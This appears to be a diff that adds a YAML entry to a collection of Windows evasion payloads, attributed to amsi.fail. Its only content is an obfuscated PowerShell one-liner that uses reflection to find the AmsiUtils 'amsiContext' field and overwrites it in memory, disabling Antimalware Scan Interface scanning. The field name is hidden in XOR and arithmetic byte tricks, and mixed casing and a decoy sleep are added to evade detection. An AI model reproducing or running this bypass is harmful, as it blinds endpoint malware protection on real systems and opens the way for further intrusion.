@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "amsi-bypass-windows-fieldoffset.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-27"
+  authors: ["@s3mme", "@TIVKU", "https://amsi.fail/"]
+
+content: |
+  & {$Cf7vWL1S=[aPPDomAin]::CUrreNtDomAin.GETAssemBLIEs()|WHerE-OBJEct{$_.LocAtiOn -AND $_.lOcaTIon.EndswITH('System.Management.Automation.dll')};$PK9tdmGiEzA6=[SySTEm.reFleCtion.BiNdiNGflAGs]'NonPublic,Static';[System.THrEaDINg.thREaD]::Sleep(213);$QwTo=$Cf7vWl1s.gEtTYPeS()|wHERe-obJEct{$_.NaME -eQ $(('{0}{1}{2}' -F 'AmsiUt','il','s'))};$H4ECQuI='c2lLVlY3GG3Qh';$H8D8TgKo7KQU=$qwto.getFIeLd($(([syStEM.TexT.eNcOdING]::aSCiI.geTsTrING([BYte[]]((97+21-21),(109*40/40),(0x72Aa -BXOr 0X72D9),(0X70Fa -bXOr 0X7093),(67*57/57),(111*17/17),((110)),(0x19AF -bxoR 0X19dB),(101+19-19),(0x8Acd -BXOR 0x8ab5),(5+111))))),$pk9tdMGIeZA6).gETvalUe($Null);$EVSANnGYXl=[systeM.BITcOnVertER]::GEtBYtes([SYSTEm.INt32]::MAXvAlue);[voID](geT-VARiAbLE -naMe 'UDL33R' -ERrOractioN SiLenTLycoNTInue);[SYsteM.RunTIME.IntEroPsErViCEs.MArShal]::Copy($eVsANNGYXl,0,$H8d8TgKO7Kqu,4)}
